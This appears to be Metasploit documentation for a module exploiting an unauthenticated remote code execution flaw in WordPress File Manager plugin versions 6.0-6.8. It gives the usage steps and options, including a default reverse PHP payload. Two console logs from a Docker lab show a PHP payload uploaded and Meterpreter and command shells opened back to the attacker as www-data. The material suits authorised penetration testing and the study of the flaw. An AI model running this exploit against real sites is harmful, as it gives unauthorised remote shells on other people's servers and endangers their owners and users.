## Vulnerable Application

Get a copy of version 6.0 plugin from https://wordpress.org/plugins/wp-file-manager/advanced/.

Vulnerable versions are 6.0-6.8. Versions below 6 are not vulnerable and version 6.9 has been patched.

## Verification Steps

1. Start msfconsole
2. Do: `use exploit/multi/http/wp_file_manager_rce`
3. Do: `set TARGETURI <target_uri>`
4. Do: `set RHOSTS <target_ip>`
5. Optional: Do: `set RPORT <target_port>`
6. Optional: Do: `set PAYLOAD <payload>` to switch payloads
7. Optional: Do: `set VERBOSE true` for more information
8. Do: `check` to confirm existence of vulnerability or `exploit` to let the shells rain

## Options
`TARGETURI`: location of the WordPres File Manager root directory. Change with `set TARGETURI <target_uri>`
`PAYLOAD`: the payload to execute. Change with `set PAYLOAD <payload>`

### Option Name
`TARGETURI`:  should point to the location of the WordPress File Manager root directory. By default, it is
`/wp-content/plugins/wp-file-manager`.
`PAYLOAD`: the payload to execute. By default, it is `php/reverse_php`.

## Scenarios

Tested against WordPress 5.5.1 in a Docker container with File Manager plugin version 6.0

### Docker container, WordPress 5.5.1, File Manager plugin version 6.0, default path for File Manager, default payload

```
msf6 > use exploit/multi/http/wp_file_manager_rce 
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(multi/http/wp_file_manager_rce) > set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
msf6 exploit(multi/http/wp_file_manager_rce) > set RPORT 8080
RPORT => 8080
msf6 exploit(multi/http/wp_file_manager_rce) > set VERBOSE true
VERBOSE => true
msf6 exploit(multi/http/wp_file_manager_rce) > exploit

[*] Started reverse TCP handler on 192.168.137.128:4444 
[*] 127.0.0.1:8080 - Detected WordPress File Manager version 6.0
[*] 127.0.0.1:8080 - Payload is at /wp-content/plugins/wp-file-manager/lib/files/gnjqFk.php
[*] Sending stage (39264 bytes) to 172.17.0.2
[*] Meterpreter session 1 opened (192.168.137.128:4444 -> 172.17.0.2:45710) at 2020-10-11 00:49:34 +0800

meterpreter > sysinfo
Computer    : 6e5e66001274
OS          : Linux 6e5e66001274 5.8.0-kali1-amd64 #1 SMP Debian 5.8.7-1kali1 (2020-09-14) x86_64
Meterpreter : php/linux
meterpreter > getuid
Server username: www-data (33)
meterpreter > 
```

### Docker container, WordPress 5.5.1, File Manager plugin version 6.0, default path for File Manager, `php/reverse_php` payload
```
msf6 exploit(multi/http/wp_file_manager_rce) > set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
msf6 exploit(multi/http/wp_file_manager_rce) > set RPORT 8080
RPORT => 8080
msf6 exploit(multi/http/wp_file_manager_rce) > set VERBOSE true
VERBOSE => true
msf6 exploit(multi/http/wp_file_manager_rce) > set PAYLOAD php/reverse_php
PAYLOAD => php/reverse_php
msf6 exploit(multi/http/wp_file_manager_rce) > exploit

[*] Started reverse TCP handler on 192.168.137.128:4444 
[*] 127.0.0.1:8080 - Detected WordPress File Manager version 6.0
[*] 127.0.0.1:8080 - Payload is at /wp-content/plugins/wp-file-manager/lib/files/G8hgHC.php
[*] Command shell session 2 opened (192.168.137.128:4444 -> 172.17.0.2:45718) at 2020-10-11 00:50:52 +0800

uname -a
Linux 6e5e66001274 5.8.0-kali1-amd64 #1 SMP Debian 5.8.7-1kali1 (2020-09-14) x86_64 GNU/Linux
whoami
www-data
```
